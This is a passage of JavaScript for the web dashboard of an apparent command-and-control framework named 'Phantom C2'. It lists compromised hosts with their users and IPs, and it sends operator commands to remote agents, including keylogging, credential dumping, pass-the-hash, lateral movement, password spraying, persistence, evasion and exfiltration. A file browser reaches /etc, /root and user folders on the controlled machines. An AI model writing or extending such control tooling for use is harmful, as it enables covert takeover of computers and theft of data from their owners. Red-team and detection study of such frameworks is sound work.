  const dashKey = agents.map(a => a.name+':'+a.status).join(',');
  if (dashKey !== window._lastDashKey) {
    window._lastDashKey = dashKey;
    if (agents.length > 0) {
      wrap.innerHTML = '<div style="display:flex;flex-direction:column;gap:5px;padding:10px">' + agents.map(a => {
        const tagBadges = (a.tags||[]).map(t =>
          '<span style="background:rgba(99,102,241,0.2);color:#818cf8;padding:1px 6px;border-radius:10px;font-size:10px;font-weight:600;">'+t+'</span>'
        ).join('');
        return '<div class="agent-card" onclick="selectAgent(\''+a.name+'\')">' +
          // Status dot
          '<div style="width:8px;height:8px;border-radius:50%;flex-shrink:0;background:'+(a.status==='active'?'#22c55e':a.status==='idle'?'#f59e0b':'#6b7280')+';box-shadow:'+(a.status==='active'?'0 0 6px #22c55e':'none')+'"></div>' +
          // OS icon
          '<span style="font-size:16px;flex-shrink:0">'+osIcon(a.os)+'</span>' +
          // Name + rename
          '<div style="min-width:110px;flex-shrink:0">' +
            '<div style="font-size:13px;font-weight:700;color:var(--accent-light)">'+a.name+'</div>' +
            '<div style="font-size:10px;color:var(--text-muted)">'+a.os+'</div>' +
          '</div>' +
          // Divider
          '<div style="width:1px;height:28px;background:var(--border);flex-shrink:0"></div>' +
          // Host / User / IP
          '<div style="display:flex;gap:16px;flex:1;min-width:0">' +
            '<div><div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px">Host</div><div style="font-size:12px;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:140px">'+a.hostname+'</div></div>' +
            '<div><div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px">User</div><div style="font-size:12px;color:var(--text-primary);white-space:nowrap">'+a.username+'</div></div>' +
            '<div><div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px">IP</div><div style="font-size:12px;color:var(--cyan);font-family:monospace">'+a.ip+'</div></div>' +
            '<div><div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px">Last Seen</div><div class="agent-lastseen-'+a.name.replace(/[^a-z0-9]/gi,'_')+'" style="font-size:12px;color:var(--text-secondary)">'+a.last_seen+'</div></div>' +
          '</div>' +
          // Tags
          (tagBadges ? '<div style="display:flex;gap:3px;flex-shrink:0">'+tagBadges+'</div>' : '') +
          // Actions
          '<div style="display:flex;gap:4px;flex-shrink:0">' +
            '<button onclick="event.stopPropagation();tagAgent(\''+a.name+'\')" title="Tags" style="padding:3px 7px;font-size:11px;background:var(--bg-input);border:1px solid var(--border);border-radius:4px;color:var(--text-muted);cursor:pointer">🏷</button>' +
            '<button onclick="event.stopPropagation();renameAgent(\''+a.name+'\')" title="Rename" style="padding:3px 7px;font-size:11px;background:var(--bg-input);border:1px solid var(--border);border-radius:4px;color:var(--text-muted);cursor:pointer">✏️</button>' +
          '</div>' +
          badge(a.status) +
        '</div>';
      }).join('') + '</div>';
    } else {
      wrap.innerHTML = '<div class="empty"><div class="empty-icon">📡</div><div class="empty-text">Waiting for agents...</div><div class="empty-sub">Deploy an agent to get started</div></div>';
    }
  } else if (agents.length > 0) {
    agents.forEach(a => {
      const el = wrap.querySelector('.agent-lastseen-'+a.name.replace(/[^a-z0-9]/gi,'_'));
      if (el) el.textContent = a.last_seen;
    });
  }

  // All agents table — only rebuild when agent list changes, update Last Seen in-place
  const agentTableKey = agents.map(a => a.name+':'+a.status).join(',');
  const agentTable = document.getElementById('all-agents');
  if (agentTableKey !== window._lastAgentTableKey) {
    window._lastAgentTableKey = agentTableKey;
    agentTable.innerHTML = agents.map(a => {
      const actions = '<button class="qbtn" onclick="selectAgent(\''+a.name+'\')" style="margin-right:4px">Interact</button>' +
        (a.status === 'dead' ? '<button class="qbtn" onclick="removeAgent(\''+a.id+'\')" style="color:var(--red);font-size:11px" title="Remove dead agent">Remove</button>' : '');
      const tagHtml = (a.tags||[]).map(t =>
        '<span style="background:rgba(99,102,241,0.2);color:#818cf8;padding:1px 6px;border-radius:10px;font-size:10px;margin-right:2px;">'+t+'</span>'
      ).join('') + '<span onclick="tagAgent(\''+a.name+'\')" style="cursor:pointer;color:var(--text-muted);font-size:10px;margin-left:2px;" title="Edit tags">✏️</span>';
      return '<tr data-agent="'+a.name+'"><td><input type="checkbox" class="bulk-cb" data-agent="'+a.name+'" data-id="'+a.id+'" data-status="'+a.status+'"></td>' +
        '<td><strong style="color:var(--accent-light)">'+a.name+' <span onclick="renameAgent(\''+a.name+'\')" style="font-size:10px;cursor:pointer;color:var(--text-muted)" title="Rename">✏️</span></strong></td>' +
        '<td>'+osIcon(a.os)+' '+a.os+'</td><td>'+a.hostname+'</td><td>'+a.username+'</td>' +
        '<td style="font-family:monospace">'+a.ip+'</td><td>'+a.sleep+'</td>' +
        '<td class="last-seen">'+a.last_seen+'</td><td>'+badge(a.status)+'</td>' +
        '<td>'+tagHtml+'</td><td>'+actions+'</td></tr>';
    }).join('') || '<tr><td colspan="11" class="empty">No agents</td></tr>';
  } else {
    // Just update Last Seen column in-place
    agents.forEach(a => {
      const row = agentTable.querySelector('tr[data-agent="'+a.name+'"]');
      if (row) {
        const ls = row.querySelector('.last-seen');
        if (ls) ls.textContent = a.last_seen;
      }
    });
  }

  // Listeners
  document.getElementById('all-listeners').innerHTML = listeners.map(l => {
    const actions = l.status === 'running'
      ? '<button class="qbtn" onclick="stopListener(\''+l.name+'\')" style="padding:4px 10px;font-size:11px;background:rgba(239,68,68,0.15);color:#ef4444;">⏹ Stop</button>'
      : '<button class="qbtn" onclick="startListener(\''+l.name+'\')" style="padding:4px 10px;font-size:11px;background:rgba(16,185,129,0.15);color:#10b981;">▶ Start</button>';
    return '<tr><td style="font-weight:600">'+l.name+'</td><td>'+l.type+'</td><td style="font-family:monospace">'+l.bind+'</td><td>'+badge(l.status)+'</td><td>'+actions+'</td></tr>';
  }).join('');
  loadPresets();

  // Dashboard tasks
  document.getElementById('dash-tasks').innerHTML = tasks.slice(0,8).map(t =>
    '<tr><td style="color:var(--accent-light);font-weight:500">'+t.agent+'</td><td>'+t.type+'</td><td><code style="color:var(--cyan)">'+((t.args||'').substring(0,40)||'—')+'</code></td><td>'+badge(t.status)+'</td><td style="color:var(--text-muted)">'+t.time+'</td></tr>'
  ).join('') || '<tr><td colspan="5" class="empty">No tasks yet</td></tr>';

  // All tasks
  document.getElementById('all-tasks').innerHTML = tasks.map(t =>
    '<tr><td style="font-family:monospace;font-size:11px">'+t.id+'</td><td style="color:var(--accent-light)">'+t.agent+'</td><td>'+t.type+'</td><td><code style="color:var(--cyan)">'+((t.args||'').substring(0,30)||'—')+'</code></td><td>'+badge(t.status)+'</td><td style="color:var(--text-muted)">'+t.time+'</td><td style="max-width:250px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:monospace;font-size:11px;color:var(--text-muted)">'+(t.output||'—')+'</td></tr>'
  ).join('');

  // Agent selector — only rebuild if agent list actually changed
  const sel = document.getElementById('agent-select');
  const cur = currentTermAgent || sel.value;
  const sortedAgents = [...agents].sort((a,b) => a.name.localeCompare(b.name));
  const newAgentKey = sortedAgents.map(a => a.name).join(',');
  if (newAgentKey !== window._lastAgentKey) {
    window._lastAgentKey = newAgentKey;
    // Suppress onchange during rebuild — the innerHTML swap briefly removes
    // the selected option, which triggers onchange → onAgentSelect() → sets
    // currentTermAgent to the wrong agent. This is the root cause of the
    // "agent interchanging" bug.
    sel.onchange = null;
    const opts = sortedAgents.map(a => {
      const status = a.status !== 'active' ? ' ['+a.status+']' : '';
      return '<option value="'+a.name+'" '+(a.name===cur?'selected':'')+'>'+osIconChar(a.os)+' '+a.name+' — '+a.hostname+status+'</option>';
    }).join('');
    sel.innerHTML = '<option value="">Select an agent...</option>' + opts;
    if (cur) sel.value = cur;
    sel.onchange = onAgentSelect;
  } else {
    // No rebuild needed — just update status text in-place
    sortedAgents.forEach(a => {
      const opt = sel.querySelector('option[value="'+a.name+'"]');
      if (opt) {
        const status = a.status !== 'active' ? ' ['+a.status+']' : '';
        opt.textContent = osIconChar(a.os)+' '+a.name+' — '+a.hostname+status;
      }
    });
  }

  // Events
  if (events.length > 0) {
    document.getElementById('event-log').innerHTML = events.map(e =>
      '<div class="event-item">'+e+'</div>'
    ).join('');
  }
}

// ──── Agent Selection ────
function selectAgent(name) {
  document.getElementById('agent-select').value = name;
  onAgentSelect();
  nav('terminal');
}

var currentTermAgent = '';

function onAgentSelect() {
  var name = document.getElementById('agent-select').value;
  if (!name) return;

  // Save current agent terminal
  if (currentTermAgent) {
    agentTerminals[currentTermAgent] = { html: document.getElementById('term-body').innerHTML };
  }

  // Switch to new agent
  currentTermAgent = name;
  document.getElementById('term-prompt').innerHTML = 'phantom [<span style="color:var(--cyan)">'+name+'</span>] &gt;';
  document.getElementById('term-title').textContent = 'Phantom C2 — ' + name;

  // Restore or init terminal for this agent
  if (agentTerminals[name]) {
    document.getElementById('term-body').innerHTML = agentTerminals[name].html;
  } else {
    document.getElementById('term-body').innerHTML = '<div class="term-info">✓ Session started with ' + name + '</div>';
  }

  // Update tabs
  if (window._cachedAgents) updateAgentTabs(window._cachedAgents);
}

// ──── Terminal ────
function termLog(type, text) {
  const body = document.getElementById('term-body');
  const div = document.createElement('div');
  div.className = 'term-' + (type || 'output');
  if (type === 'output' || type === 'success') {
    div.innerHTML = colorizeOutput(text);
  } else {
    div.textContent = text;
  }
  body.appendChild(div);
  body.scrollTop = body.scrollHeight;
}

async function sendTermCmd() {
  const input = document.getElementById('term-input');
  const raw = input.value.trim();
  input.value = '';
  if (!raw) return;

  const agent = document.getElementById('agent-select').value || currentTermAgent;
  if (!agent) { termLog('error', '✗ No agent selected'); return; }
  document.getElementById('agent-select').value = agent;

  cmdHistory.push(raw); historyIdx = cmdHistory.length;
  termLog('line', '❯ ' + raw);

  const parts = raw.split(/\s+/);
  let cmd = parts[0].toLowerCase(), args = parts.slice(1).join(' ');

  if (['shell','exec','cmd'].includes(cmd)) { cmd = 'shell'; }
  else if (cmd === '?') { cmd = 'help'; args = ''; }
  else if (!['help','sysinfo','ifconfig','ipconfig','ps','screenshot','download','upload','persist','sleep','cd','kill','evasion','token','keylog','socks','portfwd','creds','pivot','lateral','wmiexec','winrm','psexec','pth','exfil','assembly','ad','initaccess','portscan','spray','netdiscover','location','gps','clipboard','fileget','grab'].includes(cmd) && !cmd.startsWith('ad-')) {
    args = raw; cmd = 'shell';
  }

  try {
    const resp = await fetch('/api/cmd', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent,command:cmd,args}) });
    const data = await resp.json();
    if (data.error) { termLog('error', '✗ ' + data.error); }
    else if (data.inline) { termLog('output', data.output); }
    else { termLog('info', '⏳ Task queued: ' + data.type + ' (' + data.task_id.substring(0,8) + ')'); pollResult(data.task_id, agent); }
  } catch(e) { termLog('error', '✗ ' + e.message); }
}

async function pollResult(taskId, agentName) {
  for (let i = 0; i < 30; i++) {
    await new Promise(r => setTimeout(r, 2000));
    try {
      const detail = await fetchJ('/api/agent/' + agentName);
      if (detail.tasks) {
        const task = detail.tasks.find(t => taskId.startsWith(t.id) || t.id === taskId.substring(0,8));
        if (task && (task.output || task.error) && !['pending','sent'].includes(task.status)) {
          if (task.error) { termLog('error', task.error); }
          else { termLog('output', task.output); }
          return;
        }
      }
    } catch(e) {}
  }
  termLog('info', '⏳ Timeout — check Tasks page');
}

function quickCmd(cmd) { const a=document.getElementById('agent-select').value; if(!a){nav('terminal');termLog('error','✗ No agent selected');return;} nav('terminal'); document.getElementById('term-input').value=cmd; sendTermCmd(); }
function sendShell(cmd) { const a=document.getElementById('agent-select').value; if(!a){nav('terminal');termLog('error','✗ No agent selected');return;} nav('terminal'); document.getElementById('term-input').value='shell '+cmd; sendTermCmd(); }

document.getElementById('term-input').addEventListener('keydown', function(e) {
  if (e.key==='ArrowUp' && cmdHistory.length>0) { historyIdx=Math.max(0,historyIdx-1); this.value=cmdHistory[historyIdx]||''; e.preventDefault(); }
  else if (e.key==='ArrowDown') { historyIdx=Math.min(cmdHistory.length,historyIdx+1); this.value=cmdHistory[historyIdx]||''; e.preventDefault(); }
});

// ──── Charts ────
let beaconHistory = [];

function drawBeaconChart(agents) {
  const canvas = document.getElementById('beacon-chart');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const w = canvas.width = canvas.parentElement.clientWidth;
  const h = canvas.height = 140;

  // Track check-ins over time
  const now = Date.now();
  beaconHistory.push({ time: now, count: agents.filter(a=>a.status==='active').length });
  if (beaconHistory.length > 60) beaconHistory.shift();

  ctx.clearRect(0, 0, w, h);

  // Grid lines
  ctx.strokeStyle = 'rgba(42,48,80,0.4)';
  ctx.lineWidth = 1;
  for (let i = 0; i < 5; i++) {
    const y = (h / 5) * i + 10;
    ctx.beginPath(); ctx.moveTo(40, y); ctx.lineTo(w - 10, y); ctx.stroke();
  }

  if (beaconHistory.length < 2) return;

  const maxVal = Math.max(...beaconHistory.map(b=>b.count), 1);
  const stepX = (w - 50) / (beaconHistory.length - 1);

  // Gradient fill
  const grad = ctx.createLinearGradient(0, 0, 0, h);
  grad.addColorStop(0, 'rgba(124,58,237,0.3)');
  grad.addColorStop(1, 'rgba(124,58,237,0)');

  ctx.beginPath();
  ctx.moveTo(40, h - 10);
  beaconHistory.forEach((b, i) => {
    const x = 40 + i * stepX;
    const y = h - 10 - ((b.count / maxVal) * (h - 30));
    if (i === 0) ctx.lineTo(x, y);
    else ctx.lineTo(x, y);
  });
  ctx.lineTo(40 + (beaconHistory.length - 1) * stepX, h - 10);
  ctx.closePath();
  ctx.fillStyle = grad;
  ctx.fill();

  // Line
  ctx.beginPath();
  beaconHistory.forEach((b, i) => {
    const x = 40 + i * stepX;
    const y = h - 10 - ((b.count / maxVal) * (h - 30));
    if (i === 0) ctx.moveTo(x, y);
    else ctx.lineTo(x, y);
  });
  ctx.strokeStyle = '#7c3aed';
  ctx.lineWidth = 2;
  ctx.stroke();

  // Dots on line
  beaconHistory.forEach((b, i) => {
    if (i % 5 === 0 || i === beaconHistory.length - 1) {
      const x = 40 + i * stepX;
      const y = h - 10 - ((b.count / maxVal) * (h - 30));
      ctx.beginPath();
      ctx.arc(x, y, 3, 0, Math.PI * 2);
      ctx.fillStyle = '#a78bfa';
      ctx.fill();
    }
  });

  // Y-axis labels
  ctx.fillStyle = '#5a6580';
  ctx.font = '10px Inter, sans-serif';
  ctx.textAlign = 'right';
  for (let i = 0; i <= 4; i++) {
    const val = Math.round((maxVal / 4) * (4 - i));
    const y = (h / 5) * i + 14;
    ctx.fillText(val, 34, y);
  }

  // Current value label
  const lastVal = beaconHistory[beaconHistory.length - 1].count;
  const lastX = 40 + (beaconHistory.length - 1) * stepX;
  const lastY = h - 10 - ((lastVal / maxVal) * (h - 30));
  ctx.fillStyle = '#a78bfa';
  ctx.font = 'bold 11px Inter';
  ctx.textAlign = 'left';
  ctx.fillText(lastVal + ' active', lastX + 8, lastY + 4);
}

function drawOSChart(agents) {
  const canvas = document.getElementById('os-chart');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const w = canvas.width = canvas.parentElement.clientWidth;
  const h = canvas.height = 150;

  ctx.clearRect(0, 0, w, h);

  if (agents.length === 0) {
    ctx.fillStyle = '#5a6580';
    ctx.font = '12px Inter';
    ctx.textAlign = 'center';
    ctx.fillText('No data', w/2, h/2);
    return;
  }

  // Count by OS
  const osCounts = {};
  agents.forEach(a => { osCounts[a.os] = (osCounts[a.os] || 0) + 1; });
  const osColors = { windows: '#3b82f6', linux: '#10b981', android: '#f59e0b', ios: '#8b5cf6', mobile: '#06b6d4' };
  const osIcons = { windows: '🪟', linux: '🐧', android: '📱', ios: '🍎' };
  const entries = Object.entries(osCounts).sort((a,b) => b[1] - a[1]);
  const total = agents.length;

  // Donut chart
  const cx = w / 2, cy = 55, r = 40, rInner = 24;
  let startAngle = -Math.PI / 2;

  entries.forEach(([os, count]) => {
    const sliceAngle = (count / total) * Math.PI * 2;
    ctx.beginPath();
    ctx.arc(cx, cy, r, startAngle, startAngle + sliceAngle);
    ctx.arc(cx, cy, rInner, startAngle + sliceAngle, startAngle, true);
    ctx.closePath();
    ctx.fillStyle = osColors[os] || '#64748b';
    ctx.fill();
    startAngle += sliceAngle;
  });

  // Center text
  ctx.fillStyle = '#e8ecf4';
  ctx.font = 'bold 18px Inter';
  ctx.textAlign = 'center';
  ctx.fillText(total, cx, cy + 3);
  ctx.fillStyle = '#5a6580';
  ctx.font = '9px Inter';
  ctx.fillText('TOTAL', cx, cy + 14);

  // Legend
  let ly = 110;
  entries.forEach(([os, count]) => {
    const icon = osIcons[os] || '💻';
    const pct = Math.round((count / total) * 100);
    ctx.fillStyle = osColors[os] || '#64748b';
    ctx.beginPath();
    ctx.roundRect(10, ly - 8, 8, 8, 2);
    ctx.fill();
    ctx.fillStyle = '#8892b0';
    ctx.font = '11px Inter';
    ctx.textAlign = 'left';
    ctx.fillText(icon + ' ' + os + '  ' + count + ' (' + pct + '%)', 24, ly);
    ly += 16;
  });
}

function drawNetworkGraph(agents) {
  const canvas = document.getElementById('network-graph');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const dpr = window.devicePixelRatio || 1;
  const w = canvas.parentElement.clientWidth;
  const h = 320;
  canvas.width = w * dpr; canvas.height = h * dpr;
  canvas.style.width = w + 'px'; canvas.style.height = h + 'px';
  ctx.scale(dpr, dpr);
  ctx.clearRect(0, 0, w, h);

  const colors = {
    bg: '#080c16', grid: 'rgba(42,48,80,0.3)',
    c2: '#7c3aed', c2glow: 'rgba(124,58,237,0.3)',
    active: '#10b981', dead: '#ef4444', dormant: '#f59e0b',
    line: 'rgba(124,58,237,0.4)', arrow: '#a78bfa',
    text: '#8892b0', dim: '#5a6580', white: '#e8ecf4'
  };

  // Grid background
  ctx.strokeStyle = colors.grid; ctx.lineWidth = 0.5;
  for (let x = 0; x < w; x += 40) { ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,h); ctx.stroke(); }
  for (let y = 0; y < h; y += 40) { ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(w,y); ctx.stroke(); }

  // ── C2 SERVER (tower icon at top center) ──
  const sx = w/2, sy = 45;

  // Server tower
  ctx.fillStyle = colors.c2glow;
  ctx.fillRect(sx-18, sy-25, 36, 40);
  ctx.strokeStyle = colors.c2; ctx.lineWidth = 1.5;
  ctx.strokeRect(sx-18, sy-25, 36, 40);
  // Server slots
  for (let i = 0; i < 3; i++) {
    ctx.fillStyle = colors.c2;
    ctx.fillRect(sx-12, sy-20+i*12, 20, 6);
    ctx.fillStyle = i===0?colors.active:colors.arrow;
    ctx.beginPath(); ctx.arc(sx+12, sy-17+i*12, 2, 0, Math.PI*2); ctx.fill();
  }
  // Server base
  ctx.fillStyle = colors.c2; ctx.fillRect(sx-22, sy+16, 44, 4);

  // Label
  ctx.fillStyle = colors.white; ctx.font = 'bold 11px Inter'; ctx.textAlign = 'center';
  ctx.fillText('PHANTOM C2', sx, sy+35);
  ctx.fillStyle = colors.dim; ctx.font = '9px JetBrains Mono';
  ctx.fillText('YOUR_C2_IP:8080', sx, sy+47);

  if (agents.length === 0) {
    ctx.fillStyle = colors.dim; ctx.font = '13px Inter';
    ctx.fillText('Waiting for beacons...', w/2, h/2+30);
    return;
  }

  // Group by OS
  const winAgents = agents.filter(a => a.os === 'windows');
  const linAgents = agents.filter(a => a.os !== 'windows');

  function drawComputerIcon(x, y, a) {
    const sc = a.status==='active'?colors.active:a.status==='dormant'?colors.dormant:colors.dead;
    const isWin = a.os === 'windows';

    // Connection line from C2 → agent
    ctx.beginPath(); ctx.moveTo(sx, sy+20);
    const mid = (sy+20+y-20)/2;
    ctx.bezierCurveTo(sx, mid, x, mid, x, y-20);
    ctx.strokeStyle = sc; ctx.lineWidth = 1.5; ctx.globalAlpha = 0.5;
    ctx.setLineDash([6,3]); ctx.stroke(); ctx.setLineDash([]); ctx.globalAlpha = 1;

    // Arrow head
    ctx.fillStyle = sc;
    ctx.beginPath(); ctx.moveTo(x, y-20); ctx.lineTo(x-4, y-28); ctx.lineTo(x+4, y-28); ctx.fill();

    // Monitor body
    ctx.fillStyle = a.status==='active'?'rgba(16,185,129,0.08)':'rgba(239,68,68,0.05)';
    const mw = 44, mh = 30;
    ctx.fillRect(x-mw/2, y-mh/2, mw, mh);
    ctx.strokeStyle = sc; ctx.lineWidth = 1.5;
    ctx.strokeRect(x-mw/2, y-mh/2, mw, mh);

    // Screen content
    if (isWin) {
      // Windows logo
      ctx.fillStyle = sc; ctx.globalAlpha = 0.7;
      ctx.fillRect(x-8, y-10, 7, 7); ctx.fillRect(x+1, y-10, 7, 7);
      ctx.fillRect(x-8, y-1, 7, 7); ctx.fillRect(x+1, y-1, 7, 7);
      ctx.globalAlpha = 1;
    } else {
      // Linux terminal
      ctx.fillStyle = sc; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
      ctx.fillText('>_', x, y+3);
    }

    // Monitor stand
    ctx.strokeStyle = sc; ctx.lineWidth = 1;
    ctx.beginPath(); ctx.moveTo(x, y+mh/2); ctx.lineTo(x, y+mh/2+6); ctx.stroke();
    ctx.beginPath(); ctx.moveTo(x-8, y+mh/2+6); ctx.lineTo(x+8, y+mh/2+6); ctx.stroke();

    // Status LED
    ctx.beginPath(); ctx.arc(x+mw/2-5, y-mh/2+5, 3, 0, Math.PI*2);
    ctx.fillStyle = sc; ctx.fill();
    if (a.status === 'active') {
      ctx.beginPath(); ctx.arc(x+mw/2-5, y-mh/2+5, 6, 0, Math.PI*2);
      ctx.fillStyle = sc.replace(')', ',0.2)').replace('rgb','rgba');
      ctx.fill();
    }

    // Hostname
    ctx.fillStyle = colors.white; ctx.font = 'bold 10px Inter'; ctx.textAlign = 'center';
    const label = a.hostname || a.name;
    ctx.fillText(label.length > 14 ? label.substring(0,12)+'..' : label, x, y+mh/2+20);

    // Username@IP
    ctx.fillStyle = colors.dim; ctx.font = '8px JetBrains Mono';
    ctx.fillText((a.username?a.username+'@':'')+a.ip, x, y+mh/2+30);

    // Agent name
    ctx.fillStyle = colors.arrow; ctx.font = '8px Inter';
    ctx.fillText(a.name, x, y+mh/2+40);

    // Status badge
    const badgeText = a.status.toUpperCase();
    const tw = ctx.measureText(badgeText).width + 8;
    ctx.fillStyle = sc.replace(')', ',0.15)').replace('rgb','rgba').replace('#','');
    // Use hex color for badge bg
    ctx.globalAlpha = 0.2; ctx.fillStyle = sc;
    ctx.fillRect(x-tw/2, y-mh/2-14, tw, 12); ctx.globalAlpha = 1;
    ctx.fillStyle = sc; ctx.font = 'bold 7px Inter';
    ctx.fillText(badgeText, x, y-mh/2-5);
  }

  // Layout: Windows agents on left, Linux on right
  const allAgents = [...winAgents, ...linAgents];
  const cols = Math.min(allAgents.length, Math.floor(w / 130));
  const rows = Math.ceil(allAgents.length / cols);
  const colW = w / (cols + 1);
  const rowH = (h - 120) / Math.max(rows, 1);
  const startY = 140;

  allAgents.forEach((a, i) => {
    const col = i % cols;
    const row = Math.floor(i / cols);
    const x = colW * (col + 1);
    const y = startY + row * rowH;
    drawComputerIcon(x, y, a);
  });

  // Legend
  ctx.globalAlpha = 0.7;
  ctx.font = '9px Inter'; ctx.textAlign = 'left';
  const ly = h - 12;
  ctx.fillStyle = colors.active; ctx.fillRect(10, ly-8, 8, 8);
  ctx.fillStyle = colors.text; ctx.fillText('Active', 22, ly);
  ctx.fillStyle = colors.dormant; ctx.fillRect(70, ly-8, 8, 8);
  ctx.fillStyle = colors.text; ctx.fillText('Dormant', 82, ly);
  ctx.fillStyle = colors.dead; ctx.fillRect(140, ly-8, 8, 8);
  ctx.fillStyle = colors.text; ctx.fillText('Dead', 152, ly);
  ctx.fillStyle = colors.arrow; ctx.fillText('─ ─ ─ Beacon Link', 200, ly);
  ctx.globalAlpha = 1;
}

function updateSessionHealth(agents) {
  const el = document.getElementById('session-health');
  if (!el) return;

  if (agents.length === 0) {
    el.innerHTML = '<div class="empty" style="padding:20px"><div class="empty-icon" style="font-size:28px">📊</div><div class="empty-sub">No sessions yet</div></div>';
    return;
  }

  const active = agents.filter(a => a.status === 'active').length;
  const dormant = agents.filter(a => a.status === 'dormant').length;
  const dead = agents.filter(a => a.status === 'dead').length;
  const total = agents.length;

  const activePct = total > 0 ? Math.round((active/total)*100) : 0;
  const dormantPct = total > 0 ? Math.round((dormant/total)*100) : 0;
  const deadPct = total > 0 ? Math.round((dead/total)*100) : 0;

  el.innerHTML =
    '<div style="margin-bottom:14px;">' +
    '<div style="display:flex;justify-content:space-between;font-size:11px;margin-bottom:4px;"><span style="color:var(--green)">Active</span><span style="color:var(--text-muted)">'+active+'/'+total+'</span></div>' +
    '<div style="height:6px;background:rgba(255,255,255,0.05);border-radius:3px;overflow:hidden;"><div style="height:100%;width:'+activePct+'%;background:var(--green);border-radius:3px;transition:width 0.5s;"></div></div></div>' +
    '<div style="margin-bottom:14px;">' +
    '<div style="display:flex;justify-content:space-between;font-size:11px;margin-bottom:4px;"><span style="color:var(--yellow)">Dormant</span><span style="color:var(--text-muted)">'+dormant+'/'+total+'</span></div>' +
    '<div style="height:6px;background:rgba(255,255,255,0.05);border-radius:3px;overflow:hidden;"><div style="height:100%;width:'+dormantPct+'%;background:var(--yellow);border-radius:3px;transition:width 0.5s;"></div></div></div>' +
    '<div>' +
    '<div style="display:flex;justify-content:space-between;font-size:11px;margin-bottom:4px;"><span style="color:var(--red)">Dead</span><span style="color:var(--text-muted)">'+dead+'/'+total+'</span></div>' +
    '<div style="height:6px;background:rgba(255,255,255,0.05);border-radius:3px;overflow:hidden;"><div style="height:100%;width:'+deadPct+'%;background:var(--red);border-radius:3px;transition:width 0.5s;"></div></div></div>';
}

// Hook charts into refresh
const _origRefresh = refreshAll;
refreshAll = async function() {
  await _origRefresh();
  const agents = await fetchJ('/api/agents');
  drawBeaconChart(agents);
  drawOSChart(agents);
  drawNetworkGraph(agents);
  updateSessionHealth(agents);
  updateFBAgentSelector(agents);
  updateUploadAgents(agents);
  updateAsmAgents(agents);
  updateAgentTabs(agents);
  drawHealthChart(agents);
};

// ──── Files / Screenshot / Process / Notes / Search ────

function getSelectedFBAgent() {
  const sel = document.getElementById('fb-agent');
  if (!sel.value) { alert('Select an agent first'); return null; }
  return sel.value;
}

// Track current agent OS for file browser
var fbCurrentOS = 'linux';
var fbCurrentPath = '/';

function getAgentOS(agentName) {
  if (!window._cachedAgents) return 'linux';
  const a = window._cachedAgents.find(x => x.name === agentName);
  return a ? a.os : 'linux';
}

function updateFBQuickButtons() {
  const btns = document.getElementById('fb-quick-btns');
  if (!btns) return;
  if (fbCurrentOS === 'windows') {
    btns.innerHTML = '<button class="qbtn" onclick="browseDir(\'C:\\\\\')">C:\\ (root)</button>' +
      '<button class="qbtn" onclick="browseDir(\'C:\\\\Users\')">C:\\Users</button>' +
      '<button class="qbtn" onclick="browseDir(\'C:\\\\Windows\')">C:\\Windows</button>' +
      '<button class="qbtn" onclick="browseDir(\'C:\\\\Program Files\')">Program Files</button>' +
      '<button class="qbtn" onclick="browseDir(\'C:\\\\Temp\')">C:\\Temp</button>';
    document.getElementById('fb-path').placeholder = 'C:\\';
  } else {
    btns.innerHTML = '<button class="qbtn" onclick="browseDir(\'/\')">/ (root)</button>' +
      '<button class="qbtn" onclick="browseDir(\'/home\')">home</button>' +
      '<button class="qbtn" onclick="browseDir(\'/etc\')">etc</button>' +
      '<button class="qbtn" onclick="browseDir(\'/tmp\')">tmp</button>' +
      '<button class="qbtn" onclick="browseDir(\'/var\')">var</button>' +
      '<button class="qbtn" onclick="browseDir(\'/root\')">root</button>';
    document.getElementById('fb-path').placeholder = '/';
  }
}

function fbGoUp() {
  const pathInput = document.getElementById('fb-path');
  let p = pathInput.value.trim();
  if (!p) p = fbCurrentPath;
  if (fbCurrentOS === 'windows') {
    p = p.replace(/\\+$/, '');
    const idx = p.lastIndexOf('\\');
    pathInput.value = idx > 0 ? p.substring(0, idx) : p.substring(0, 3);
  } else {
    p = p.replace(/\/+$/, '');
    const idx = p.lastIndexOf('/');
    pathInput.value = idx > 0 ? p.substring(0, idx) : '/';
  }
  browseFiles();
}

function parseDirOutput(raw, basePath) {
  // Parse Windows dir output into clickable entries
  const lines = raw.split('\n');
  let html = '';
  const sep = fbCurrentOS === 'windows' ? '\\' : '/';
  const normBase = basePath.replace(/[\\\/]+$/, '');

  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed) { html += '\n'; continue; }

    if (fbCurrentOS === 'windows') {
      // Match: 07/06/2025  06:11 PM    <DIR>          FolderName
      const dirMatch = trimmed.match(/^(\d{2}\/\d{2}\/\d{4}\s+\d{2}:\d{2}\s+[AP]M)\s+<DIR>\s+(.+)$/);
      if (dirMatch && dirMatch[2] !== '.' && dirMatch[2] !== '..') {
        const name = dirMatch[2];
        const fullPath = normBase + sep + name;
        html += '<span style="color:var(--text-muted)">' + dirMatch[1] + '  &lt;DIR&gt;  </span>' +
          '<a href="#" onclick="browseDir(\'' + fullPath.replace(/\\/g,'\\\\').replace(/'/g,"\\'") + '\');return false;" ' +
          'style="color:var(--cyan);cursor:pointer;text-decoration:none;font-weight:600;" ' +
          'onmouseover="this.style.textDecoration=\'underline\'" onmouseout="this.style.textDecoration=\'none\'">' +
          '📁 ' + name + '</a>\n';
        continue;
      }
      // Match: file lines with size
      const fileMatch = trimmed.match(/^(\d{2}\/\d{2}\/\d{4}\s+\d{2}:\d{2}\s+[AP]M)\s+([\d,]+)\s+(.+)$/);
      if (fileMatch) {
        const fname = fileMatch[3];
        const fpath = (normBase + sep + fname).replace(/\\/g,'\\\\').replace(/'/g,"\\'");
        const agent = getSelectedFBAgent();
